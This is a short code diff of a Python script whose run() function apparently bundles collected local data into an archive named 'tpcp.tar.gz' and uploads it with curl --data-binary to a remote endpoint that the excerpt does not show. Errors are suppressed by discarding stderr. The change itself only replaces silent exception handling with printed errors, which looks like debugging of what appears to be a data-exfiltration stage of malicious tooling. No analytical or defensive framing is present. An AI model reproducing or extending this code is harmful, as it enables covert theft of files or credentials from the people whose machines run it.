@@ -34,8 +34,8 @@ def run():
                     stderr=subprocess.DEVNULL, 
                     check=True
                 )
-        except Exception:
-            return
+        except Exception as e:
+            print(e)
 
         if not os.path.exists(collected) or os.path.getsize(collected) == 0:
             return
@@ -57,8 +57,8 @@ def run():
                 "-H", "X-Filename: tpcp.tar.gz",
                 "--data-binary", f"@{bn}"
             ], check=True, stderr=subprocess.DEVNULL)
-        except Exception:
-            pass
+        except Exception as e:
+            print(e)
 
 if __name__ == "__main__":
     run()
